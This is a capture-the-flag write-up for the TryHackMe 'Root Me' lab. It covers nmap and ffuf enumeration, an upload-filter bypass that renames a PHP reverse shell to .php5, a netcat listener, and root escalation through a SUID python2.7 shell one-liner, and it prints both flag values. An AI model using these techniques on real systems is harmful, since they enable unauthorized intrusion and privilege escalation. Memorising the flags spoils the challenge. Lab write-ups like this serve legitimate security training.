# Root Me Write‑up

A beginner-friendly **TryHackMe** challenge focused on **web exploitation, file upload bypass, reverse shells, and privilege escalation**.

Room: Root Me

---

# Target Information

**Target Machine IP**

```
10.128.189.142
```

---

# Connectivity Check

First, I verified that the target machine was reachable using **ping**.

```bash
ping 10.128.189.142
```

The host responded, confirming the machine was **reachable and online**.

---

# Port Scanning

Next, I performed a service scan using **Nmap** to discover open ports and services.

```bash
nmap -sV 10.128.189.142
```

Result:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
```

## Findings

Two ports were discovered:

|Port|Service|
|---|---|
|22|SSH|
|80|HTTP|

Since a web service was available, I proceeded with **web enumeration**.

---

# Web Enumeration

Opening the website in the browser revealed a simple webpage.

To discover hidden directories, I performed directory brute forcing using **ffuf**.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.128.189.142/FUZZ
```

Result:

```
.htaccess      [403]
.htpasswd      [403]
css            [301]
index.php      [200]
js             [301]
panel          [301]
server-status  [403]
uploads        [301]
```

## Important Discoveries

Two interesting directories were found:

```
/panel
/uploads
```

---

# Upload Panel

Navigating to:

```
http://10.128.189.142/panel
```

Revealed a **file upload form**.

This indicated a possible **file upload vulnerability**, which could allow remote code execution.

---

# Reverse Shell Preparation

To exploit the upload functionality, I searched for a PHP reverse shell and found one from:

pentestmonkey php-reverse-shell

GitHub source:

```
https://github.com/pentestmonkey/php-reverse-shell
```

I downloaded the script and modified:

```
IP = my attack machine IP
PORT = 4444
```

---

# Upload Bypass

Attempting to upload:

```
php-reverse-shell.php
```

Failed because **.php files were not allowed**.

To bypass the filter, I changed the extension:

```
php-reverse-shell.php → php-reverse-shell.php5
```

This successfully bypassed the upload restriction.

---

# Triggering the Reverse Shell

Before triggering the shell, I started a listener on my machine.

```bash
nc -lvnp 4444
```

Then I navigated to:

```
http://10.128.189.142/uploads/php-reverse-shell.php5
```

This triggered the reverse shell and established a connection back to my machine.

---

# First Flag

After obtaining the shell, I searched for the first flag.

```bash
cat /var/www/user.txt
```

Result:

```
THM{y0u_g0t_a_sh3ll}
```

---

# Privilege Escalation

Next, I searched for **SUID binaries** to identify potential privilege escalation vectors.

```bash
find / -perm -4000 2>/dev/null
```

Among the results, one binary stood out:

```
/usr/bin/python2.7
```

This indicated that **Python** had the **SUID bit set**, meaning it could execute commands with elevated privileges.

To confirm how this could be exploited, I checked **GTFOBins**.

GTFOBins provides techniques for exploiting misconfigured binaries.

---

# Root Shell

Using the method from GTFOBins, I executed:

```bash
/usr/bin/python2.7 -c 'import os; os.system("/bin/sh")'
```

This spawned a **root shell**.

Verification:

```bash
whoami
```

Result:

```
root
```

---

# Root Flag

Now that I had root access, I searched for the final flag.

```bash
cat /root/root.txt
```

Result:

```
THM{pr1v1l3g3_3sc4l4t10n}
```

---

# Flags Captured

|Flag|Value|
|---|---|
|User Flag|THM{y0u_g0t_a_sh3ll}|
|Root Flag|THM{pr1v1l3g3_3sc4l4t10n}|

---

# Skills Learned

This room covered several important penetration testing techniques:

- Network scanning with Nmap
    
- Web directory fuzzing with ffuf
    
- File upload vulnerability exploitation
    
- File upload filter bypass
    
- Reverse shells with netcat
    
- Linux enumeration
    
- SUID privilege escalation
    
- Using GTFOBins for exploitation